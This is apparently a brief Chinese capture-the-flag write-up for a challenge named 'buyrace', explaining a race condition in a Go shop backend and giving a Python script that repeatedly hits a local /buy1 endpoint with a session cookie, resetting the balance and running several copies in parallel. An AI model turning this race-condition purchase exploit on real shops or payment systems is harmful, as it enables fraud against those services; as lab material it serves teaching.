# buyrace

题目说了race。强行竞态条件。

本来是用自带map的但是go从某个版本开始map有并发读写会panic。就强行用slice了。

```python
import requests

headers = {
        "Host": "localhost:4000",
        "Cookie": "name=sx#fobpmplozflh"
        }

while True:
    r = requests.get("http://localhost:4000/buy1", headers=headers)
    print(r.text)
    if "余额不足" in r.text:
        requests.post("http://localhost:4000/start", headers=headers)

```

开几个shell同时跑